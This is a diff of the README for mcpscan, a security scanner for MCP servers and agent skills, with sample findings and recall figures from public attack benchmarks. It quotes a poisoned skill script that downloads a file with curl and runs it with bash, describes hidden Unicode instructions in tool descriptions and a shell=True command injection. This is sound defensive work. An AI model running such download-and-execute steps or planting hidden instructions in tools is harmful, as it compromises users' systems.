@@ -1,9 +1,13 @@
 # mcpscan
 
-A security scanner for MCP servers and agent skills. Runs locally and in CI,
+A security scanner for **MCP servers and agent skills**. Runs locally and in CI,
 finds known vulnerability patterns — tool poisoning, hidden Unicode, unsafe
-schemas — before they ship, and reports them with an exact file/line
-location, not a vague warning.
+schemas, data exfiltration, destructive helper scripts — and reports them with
+an exact file/line location, not a vague warning.
+
+Sixteen rules, 1125 tests, and every rule calibrated against third-party attack
+corpora rather than against fixtures written by the same person who wrote the
+rule. See [Measured, not asserted](#measured-not-asserted).
 
 ## Quick start
 
@@ -20,13 +24,108 @@ CRITICAL  MCP002  Invisible Unicode character in tool definition
   tools.json:5:22  tools[0].description
   Tool "read_file" has 6 invisible character(s) in `description`: U+E0049 (tag character), U+E0067 (tag character), U+E006E (tag character), U+E006F (tag character), U+E0072 (tag character), U+E0065 (tag character).
   Fix: Remove the invisible characters. This text is read by the model and never shown to the user — invisible content here is a hidden instruction, not formatting.
-  https://github.com/luked20/mcpscan/blob/main/docs/rules/MCP002.md
 
   1 critical
 ```
 
 Exit code is `1` — see [Exit codes](#exit-codes) below for what that means in
 a script.
+
+## Running it on a real repository
+
+Against [`awslabs/mcp`](https://github.com/awslabs/mcp), a 2,500-file monorepo of
+production MCP servers:
+
+```console
+$ mcpscan . --format pretty
+mcpscan · 2518 file(s) scanned · 0 with tools · 0 tool(s) · 8 server(s) · 7 skill(s) · 1161 source file(s)
+
+MEDIUM    MCP007  Unpinned MCP server provenance
+  src/aurora-dsql-mcp-server/kiro_power/mcp.json:4:15  mcpServers.aurora-dsql.args
+  Server "aurora-dsql" is started by fetching a package at run time with no exact version pin, so each run may download different code than the one you reviewed.
+  Fix: Pin the exact version (for example `package@1.4.2`), or install the package as a project dependency and point `command` at the local binary. Commit a lockfile so the transitive tree is pinned too.
+
+MEDIUM    MCP007  Unpinned MCP server provenance
+  src/cloudwatch-mcp-server/skills/agentcore-investigation/mcp/.mcp.json:4:15  mcpServers.cloudwatch.args
+  …
+
+  7 medium
+```
+
+Seven findings across 2,518 files, all the same real issue and none of them
+noise. Now the same scanner on a server from the
+[Damn Vulnerable MCP Server](https://github.com/harishsg993010/damn-vulnerable-MCP-server)
+challenge set, frozen in this repo's corpus:
+
+```console
+$ mcpscan tests/corpus/malicious/dvmcp-challenge9-command-injection --format pretty
+mcpscan · 3 file(s) scanned · 1 with tools · 5 tool(s) · 0 server(s) · 0 skill(s) · 1 source file(s)
+
+HIGH      MCP010  Dangerous execution sink in Python server source
+  server.py:55:18
+  Calls `subprocess.check_output(...)` with `shell=True` and a command built from a value built elsewhere. The string is parsed by a shell, so an interpolated value containing `;`, `|` or `$()` runs as a separate command.
+  Fix: Pass the command and its arguments as a list and leave `shell=False` (the default) — `subprocess.run(["git", "log", rev])` — so no shell parses the string. …
+
+  4 high
+```
+
+That case is worth a second look: **its `tools/list` is completely clean**, and
+correctly so — `ping_host` takes a `host` string exactly as an honest
+network-diagnostics server would. The declaration scan finds nothing; the source
+scan finds four command injections. Neither mode is a superset of the other.
+
+And a poisoned agent skill, from the
+[SKILL-INJECT](https://github.com/aisa-group/skill-inject) benchmark:
+
+```console
+$ mcpscan tests/corpus/malicious/skillinject-download-and-execute --format pretty
+HIGH      SKILL004  Skill downloads and executes remote code
+  scripts/backup.sh:4:1
+  Skill "docx" ships `scripts/backup.sh`, which downloads a file and then executes it: `curl -sLO http://…/download/patch1` writes "patch1", and `bash patch1` runs it. Nothing reads the file in between, so whatever the remote host serves at run time is executed as-is.
+```
+
+The `SKILL.md` body only says *"run the backup.sh script from this skill's
+scripts directory"* — ordinary documentation, and not a finding. The payload is
+in the file the skill ships.
+
+## Measured, not asserted
+
+Most scanners are tested against examples their own author wrote, which proves
+the rule fires on the attack its author imagined. Every rule here is measured
+two ways, against corpora from somewhere else.
+
+**Precision** — findings on code that is fine:
+
+| Corpus | Findings |
+|---|---|
+| 106 real agent skills (Anthropic's, monday.com's, n8n's, AWS Labs') | 0 |
+| `monday`, `supabase`, `playwright`, `firecrawl` repositories | 0 |
+| 125 real shell scripts | 0 |
+
+**Recall** — captured attacks from public research, frozen in
+`tests/corpus/malicious/` with their provenance and expected rule *and*
+severity, so a regression fails the build:
+
+| Attack family | Caught |
+|---|---|
+| Exfiltration | 26 / 55 |
+| Destruction | 8 / 22 |
+| Remote code execution | 3 / 4 |
+| Ransomware, DoS, phishing, bias | 1 / 44 |
+| **Total (SKILL-INJECT, 152 poisoned skills)** | **39 (25.7%)** |
+
+25.7% is a real number, not a rounded claim, and the gaps are named rather than
+hidden. Three candidate rules were **rejected** during calibration for firing on
+legitimate code — including a `git push --force` / `git reset --hard` detector
+that looked ideal until it flagged a `git` skill teaching the command and a
+`safety-protocol` skill quoting it as a thing *not* to do. A pattern cannot tell
+"do this" from "never do this."
+
+Sources: [DVMCP](https://github.com/harishsg993010/damn-vulnerable-MCP-server) ·
+[SKILL-INJECT](https://github.com/aisa-group/skill-inject) (arXiv 2602.20156) ·
+[Invariant Labs](https://github.com/invariantlabs-ai/mcp-injection-experiments) ·
+[appsecco](https://github.com/appsecco/vulnerable-mcp-servers-lab) ·
+[IntegSec](https://github.com/IntegSec/VulnerableMCP)
 
 ## CI / GitHub Action
 
@@ -41,7 +140,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - uses: luked20/mcpscan@v1
+      - uses: Luked20/mcpscan@v1
         id: scan
         continue-on-error: true
         with: { path: '.', fail-on: 'high' }
@@ -81,25 +180,27 @@ existing alerts.
 
 ## Rules
 
-| ID | Name | Severity | OWASP MCP Top 10 | Docs |
-|---|---|---|---|---|
-| `MCP001` | Model-directed instruction in tool description | critical | [MCP03:2025 – Tool Poisoning](https://owasp.org/www-project-mcp-top-10/) | [docs/rules/MCP001.md](docs/rules/MCP001.md) |
-| `MCP002` | Invisible Unicode character in tool definition | critical | [MCP03:2025 – Tool Poisoning](https://owasp.org/www-project-mcp-top-10/) | [docs/rules/MCP002.md](docs/rules/MCP002.md) |
-| `MCP003` | Model-directed instruction inside inputSchema | critical | [MCP03:2025 – Tool Poisoning](https://owasp.org/www-project-mcp-top-10/) | [docs/rules/MCP003.md](docs/rules/MCP003.md) |
-| `MCP004` | Unconstrained path parameter in a file tool | high | [MCP02:2025 – Privilege Escalation via Scope Creep](https://owasp.org/www-project-mcp-top-10/) | [docs/rules/MCP004.md](docs/rules/MCP004.md) |
-| `MCP005` | Unconstrained command parameter | high | [MCP05:2025 – Command Injection & Execution](https://owasp.org/www-project-mcp-top-10/) | [docs/rules/MCP005.md](docs/rules/MCP005.md) |
-| `MCP006` | Tool shadows or directs another tool | high | [MCP03:2025 – Tool Poisoning](https://owasp.org/www-project-mcp-top-10/) | [docs/rules/MCP006.md](docs/rules/MCP006.md) |
-| `MCP007` | Unpinned MCP server provenance | medium | [MCP04:2025 – Software Supply Chain Attacks & Dependency Tampering](https://owasp.org/www-project-mcp-top-10/) | [docs/rules/MCP007.md](docs/rules/MCP007.md) |
-| `MCP008` | Dangerous execution sink in server source | high | [MCP05:2025 – Command Injection & Execution](https://owasp.org/www-project-mcp-top-10/) | [docs/rules/MCP008.md](docs/rules/MCP008.md) |
-| `MCP009` | Credential hardcoded in MCP server configuration | high | [MCP01:2025 – Token Mismanagement & Secret Exposure](https://owasp.org/www-project-mcp-top-10/) | [docs/rules/MCP009.md](docs/rules/MCP009.md) |
-| `SKILL001` | Hidden instruction in skill body | critical | [MCP10:2025 – Context Injection & Over-Sharing](https://owasp.org/www-project-mcp-top-10/) | [docs/rules/SKILL001.md](docs/rules/SKILL001.md) |
-| `SKILL002` | Model-directed instruction in skill description | critical | [MCP10:2025 – Context Injection & Over-Sharing](https://owasp.org/www-project-mcp-top-10/) | [docs/rules/SKILL002.md](docs/rules/SKILL002.md) |
-| `SKILL003` | Skill uses a capability it does not declare | high | [MCP02:2025 – Privilege Escalation via Scope Creep](https://owasp.org/www-project-mcp-top-10/) | [docs/rules/SKILL003.md](docs/rules/SKILL003.md) |
-| `SKILL004` | Skill downloads and executes remote code | high | [MCP04:2025 – Software Supply Chain Attacks & Dependency Tampering](https://owasp.org/www-project-mcp-top-10/) | [docs/rules/SKILL004.md](docs/rules/SKILL004.md) |
+| ID | Name | Severity | OWASP MCP Top 10 |
+|---|---|---|---|
+| `MCP001` | Model-directed instruction in tool description | critical | MCP03 – Tool Poisoning |
+| `MCP002` | Invisible Unicode character in tool definition | critical | MCP03 – Tool Poisoning |
+| `MCP003` | Model-directed instruction inside inputSchema | critical | MCP03 – Tool Poisoning |
+| `MCP004` | Unconstrained path parameter in a file tool | high | MCP02 – Privilege Escalation via Scope Creep |
+| `MCP005` | Unconstrained command parameter | high | MCP05 – Command Injection & Execution |
+| `MCP006` | Tool shadows or directs another tool | high | MCP03 – Tool Poisoning |
+| `MCP007` | Unpinned MCP server provenance | medium | MCP04 – Supply Chain & Dependency Tampering |
+| `MCP008` | Dangerous execution sink in server source (JS/TS) | high | MCP05 – Command Injection & Execution |
+| `MCP009` | Credential hardcoded in MCP server configuration | high | MCP01 – Token Mismanagement & Secret Exposure |
+| `MCP010` | Dangerous execution sink in Python server source | high | MCP05 – Command Injection & Execution |
+| `SKILL001` | Hidden instruction in skill body | critical | MCP10 – Context Injection & Over-Sharing |
+| `SKILL002` | Model-directed instruction in skill description | critical | MCP10 – Context Injection & Over-Sharing |
+| `SKILL003` | Skill uses a capability it does not declare | high | MCP02 – Privilege Escalation via Scope Creep |
+| `SKILL004` | Skill downloads and executes remote code | high | MCP04 – Supply Chain & Dependency Tampering |
+| `SKILL005` | Skill sends data to a hardcoded external endpoint | high | MCP01 – Token Mismanagement & Secret Exposure |
+| `SKILL006` | Skill ships a script that deletes files wholesale | high | MCP04 – Supply Chain & Dependency Tampering |
 
-Only these thirteen rules are implemented so far — the full MVP catalog from
-`docs/SPEC.md` §7. More may be added later; see that section for the
-rationale behind the ones that already exist.
+Every rule ships with a positive fixture, a negative fixture, and a record of
+what it deliberately does **not** flag.
 
 ## Options
 
@@ -133,9 +234,10 @@ To scan them, let mcpscan start the server and ask:
 npx mcpscan . --connect "npx -y firecrawl-mcp"
 ```
 
-It speaks the MCP handshake, reads `tools/list`, and scans those tools alongside
-everything it found on disk. The server inherits your environment, so an API key
-is passed the way any client passes one:
+It speaks the MCP handshake, reads `tools/list`, `resources/list` and
+`prompts/list`, and scans those alongside everything it found on disk. The
+server inherits your environment, so an API key is passed the way any client
+passes one:
 
 ```bash
 FIRECRAWL_API_KEY=fc-… npx mcpscan . --connect "npx -y firecrawl-mcp"
@@ -162,8 +264,7 @@ numbers, so it doesn't go stale when you edit the file above a finding. Delete
 entries from it as you fix them.
 
 A baseline is the blunt instrument. When a finding has an actual answer, prefer
-a [suppression comment](docs/rules/MCPSCAN001.md) — it lives on the line and
-carries the reason.
+a suppression comment — it lives on the line and carries the reason.
 
 ## Config file
 
@@ -200,8 +301,7 @@ Several rules at once: `MCP004, MCP005`.
 nothing: the finding stands, and you get an `info` finding telling you the
 comment did not work. Same for a comment that names no rule, or names one
 that does not exist (`MCP404`) — a suppression that silently silences nothing
-is worse than no suppression at all. See
-[docs/rules/MCPSCAN001.md](docs/rules/MCPSCAN001.md).
+is worse than no suppression at all.
 
 Suppressed findings are counted in the header, so a heavily suppressed scan
 never looks like a clean one:
@@ -214,10 +314,16 @@ To silence a rule everywhere instead of line by line, use `--disable <id>`.
 
 ## Working on mcpscan
 
-[docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) is the map of the repository: what
-each folder does and how the pieces connect. [docs/SPEC.md](docs/SPEC.md) has
-the reasoning behind the decisions, and [docs/rules/](docs/rules/README.md) has
-a page per rule.
+```bash
+npm install
+npm test          # 1125 tests: rule units, fixture pairs, precision and recall harnesses
+npm run typecheck
+npm run build
+```
+
+`tests/corpus/clean/` asserts the scanner stays quiet on real code;
+`tests/corpus/malicious/` asserts it speaks up on captured attacks, checking the
+exact rule **and** severity so a downgrade fails the build too.
 
 ## Limitations
 
@@ -227,25 +333,24 @@ Read this before you trust a clean scan.
   They are **not robust against an adaptive attacker who knows the rules** —
   a pattern matcher is not a substitute for review on anything you didn't
   write yourself.
-- **Thirteen rules are implemented** (`MCP001`–`MCP009`, `SKILL001`–
-  `SKILL004`) — the full MVP catalog in `docs/SPEC.md` §7. A clean scan
-  today means "no invisible Unicode, no model-directed instruction found in
-  the tool description, input schema, or skill frontmatter/body, no
-  unconstrained path/command parameter in a file or execution tool, no tool
-  name collision or redirecting description across servers, no unpinned or
-  plaintext server provenance, no dangerous execution sink pattern in server
-  source, no hardcoded credential in an MCP config, no undeclared capability
-  used in a skill body, and no remote-code-fetch pattern in a skill body,"
-  not "this server or skill is safe."
-- **Static analysis only.** `mcpscan` never starts your MCP server or calls
-  `tools/list`. Live introspection (`--connect`) is deliberately left out of
-  the MVP because it would mean executing untrusted code to scan it.
+- **Declarations, not behaviour.** mcpscan reads what a server and a skill
+  *declare* — tool descriptions, schemas, configs, source, bundled scripts. It
+  does not observe what they do at run time. An attack that lives entirely in
+  a tool's *output*, or in a document a tool returns, is invisible to it, and
+  several such cases are kept in the corpus with empty expectations and the
+  reason written down.
+- **A snapshot, never a forecast.** A "rug pull" server — honest on its first
+  run, poisoned on its tenth — reports clean, because on the day you scanned it
+  it *was* clean. Catching that needs two snapshots compared over time, which is
+  a different feature, not a pattern.
+- **Skill coverage is 25.7% against a published benchmark.** Measured, and the
+  uncovered families are named above. MCP server coverage is considerably better
+  but has no equivalent single number, because no comparable benchmark exists.
 - **Known evasion seam in MCP002.** The rule's ZWJ/ZWNJ check only fires when
   *both* neighboring characters are ASCII/Latin, to avoid false-positiving on
   legitimate emoji sequences and Persian/Devanagari text. That leaves a gap:
   a zero-width joiner between a Latin character and a non-Latin one does not
-  trigger. See `docs/SPEC.md` §7.2 for the full policy table and why it's an
-  accepted gap rather than a bug.
+  trigger — an accepted gap rather than a bug.
 
 ## Contributing
 
@@ -255,9 +360,15 @@ Adding a rule:
 2. One line registering it in `src/rules/index.ts`.
 3. A positive fixture (`tests/fixtures/<ID>/vulnerable/`) **and** a negative
    one (`tests/fixtures/<ID>/clean/`) — a rule without both doesn't ship.
-4. `docs/rules/<ID>.md` describing the risk, a vulnerable example, a clean
-   example, and how to fix it.
+4. A measurement. Before a pattern ships it is run against the clean corpora
+   above; a rule that fires on real code is rejected, and the number that
+   rejected it is recorded in the rule's own source.
 
-Anchor new rules to the OWASP MCP Top 10 or a documented real-world case
-(Snyk's agent-skill audit, a known MCP CVE) — see `docs/SPEC.md` for the
-rationale behind the rules that already exist.
+Anchor new rules to the OWASP MCP Top 10 or a documented real-world case — and
+prefer a specific, documented rule over a broad heuristic. A false positive
+costs more than a missed finding here: it is what makes people stop reading the
+output.
+
+## License
+
+MIT
